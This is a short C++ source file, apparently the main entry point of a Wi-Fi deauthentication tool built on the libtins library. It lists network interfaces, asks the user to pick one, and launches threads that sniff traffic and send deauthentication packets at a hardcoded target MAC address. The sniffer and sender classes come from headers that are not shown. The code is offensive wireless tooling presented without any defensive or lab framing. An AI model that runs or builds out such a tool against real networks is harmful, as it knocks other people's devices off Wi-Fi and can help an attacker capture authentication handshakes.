#include <iostream>
#include <tins/tins.h>
#include <vector>
#include "data_sniffer.hpp"
#include "deauth_sender.hpp"

using namespace std;
using namespace Tins;

void printInterfaces(vector<NetworkInterface> interfaces) {
    int i = 1;
    for (auto iface : interfaces) {
        cout << i << ". " << iface.name() << endl;
        i++;
    }
}

int main() {

    vector<NetworkInterface> interfaces = NetworkInterface::all();

    printInterfaces(interfaces);

    int index;
    cout << "input network driver number > ";
    cin >> index;
    index--;
    string target = "a2:c5:89:31:99:21";
    DataSniffer *sniffer = new DataSniffer(interfaces[index].name(), "wlp2s0", "a2:c5:89:31:99:21");
    DeauthSender *sender = new DeauthSender(sniffer->getSet(), interfaces[index].name(), "a2:c5:89:31:99:21");
    thread sniffThread = thread(&DataSniffer::dataSniff, sniffer);
    thread sendThread = thread(&DeauthSender::sendPacket, sender);
    sniffThread.join();
    sendThread.join();
}